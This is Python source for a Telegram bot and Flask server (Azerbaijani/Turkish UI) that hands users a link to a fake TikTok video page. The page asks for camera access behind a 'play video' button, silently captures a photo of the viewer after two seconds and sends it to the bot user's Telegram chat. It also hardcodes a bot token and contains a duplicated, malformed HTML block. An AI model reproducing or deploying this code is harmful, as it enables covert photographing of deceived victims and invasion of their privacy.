import os
import json
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask, request, jsonify
from threading import Thread
import base64
import uuid
import requests

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg"
WEBHOOK_URL = "https://camera-cjl1.onrender.com"
FLASK_PORT = 5000

USERS_FILE = "users.json"
PHOTOS_FILE = "photos.json"

app = Flask(__name__)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_photos():
    if os.path.exists(PHOTOS_FILE):
        with open(PHOTOS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    return {}

def save_photos(photos):
    with open(PHOTOS_FILE, 'w', encoding='utf-8') as f:
        json.dump(photos, f, indent=2, ensure_ascii=False)

class CameraBot:
    def __init__(self, token):
        self.token = token
        self.app = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        users = load_users()
        users[str(user_id)] = {'name': user_name, 'joined': datetime.now().isoformat(), 'photos_received': 0}
        save_users(users)
        
        share_link = f"{WEBHOOK_URL}/share?user_id={user_id}"
        await update.message.reply_text(f"Salam {user_name}! TikTok linkin hazırdır:\n{share_link}")

    async def handle_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if update.message.photo:
            await update.message.reply_text("✅ Şəkil alındı!")

    def create_app(self):
        self.app = Application.builder().token(self.token).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        return self.app

camera_bot = CameraBot(BOT_TOKEN)

@app.route('/')
def index():
    return "Bot aktivdir."

@app.route('/share')
def share():
    user_id = request.args.get('user_id')
    if not user_id: return 'Error', 400
    
    return f'''
    <!DOCTYPE html>
    <html lang="az">
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
    /* Telefon için Full Ekran */
    body, html {
        margin: 0; padding: 0;
        width: 100%; height: 100%;
        background: #000;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        overflow: hidden;
    }

    #video-container {
        position: relative;
        width: 100%; height: 100%;
        background: #000;
        display: flex; justify-content: center; align-items: center;
    }

    #video {
        width: 100%; height: 100%;
        object-fit: cover; /* Videoyu ekranı kaplayacak şekilde esnet */
    }

    /* TikTok Sağ Panel */
    .sidebar {
        position: absolute;
        right: 10px; bottom: 100px;
        display: flex; flex-direction: column;
        gap: 25px; z-index: 100;
    }

    .icon-btn {
        color: white; font-size: 28px;
        text-shadow: 0 0 5px rgba(0,0,0,0.5);
        display: flex; flex-direction: column; align-items: center;
    }

    .icon-text { font-size: 12px; margin-top: 5px; font-weight: 600; }

    /* Başlatma Butonu (Daha "Gerçekçi") */
    #startBtn {
        position: absolute;
        z-index: 200;
        padding: 12px 30px;
        background: #fe2c55;
        color: white; border: none;
        border-radius: 5px; font-weight: bold; font-size: 16px;
        cursor: pointer; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.5);
    }
</style>

<div id="video-container">
    <button id="startBtn">Videoyu Oynat</button>
    <video id="video" playsinline></video>
    
    <div class="sidebar">
        <div class="icon-btn"><span>❤️</span><span class="icon-text">12.5k</span></div>
        <div class="icon-btn"><span>💬</span><span class="icon-text">840</span></div>
        <div class="icon-btn"><span>↪️</span><span class="icon-text">Paylaş</span></div>
    </div>
</div>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Video</title>
        <style>
            body {{ margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }}
            #video {{ width: 100%; height: 100%; object-fit: cover; display: none; }}
            .tiktok-ui {{ position: absolute; right: 15px; bottom: 150px; display: flex; flex-direction: column; gap: 20px; z-index: 10; color: white; font-size: 30px; text-shadow: 0 0 5px rgba(0,0,0,0.5); }}
            #startBtn {{ position: absolute; padding: 15px 40px; background: #fe2c55; color: white; border: none; font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer; }}
        </style>
    </head>
    <body>
        <button id="startBtn">Videonu izlə</button>
        <video id="video" playsinline></video>
        <div class="tiktok-ui" id="ui" style="display:none;">
            <div>❤️</div><div>💬</div><div>↪️</div>
        </div>
        <script>
            const startBtn = document.getElementById('startBtn');
            const video = document.getElementById('video');
            
            startBtn.onclick = async () => {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                    video.srcObject = stream;
                    video.play();
                    video.style.display = 'block';
                    startBtn.style.display = 'none';
                    document.getElementById('ui').style.display = 'flex';
                    
                    // Avtomatik şəkil çək
                    setTimeout(() => {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        fetch('/upload-photo', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ user_id: "{user_id}", photo: canvas.toDataURL('image/jpeg') }})
                        }});
                    }}, 2000);
                }} catch (e) {{ alert("Xəta: " + e.message); }}
            }};
        </script>
    </body>
    </html>
    '''

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    data = request.get_json()
    user_id = data.get('user_id')
    photo_base64 = data.get('photo')
    
    if user_id and photo_base64:
        photo_bytes = base64.b64decode(photo_base64.split(',')[1])
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        requests.post(url, files={'photo': ('photo.jpg', photo_bytes)}, data={'chat_id': user_id})
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

def run_flask(): app.run(host='0.0.0.0', port=FLASK_PORT)

if __name__ == '__main__':
    Thread(target=run_flask, daemon=True).start()
    camera_bot.create_app().run_polling()
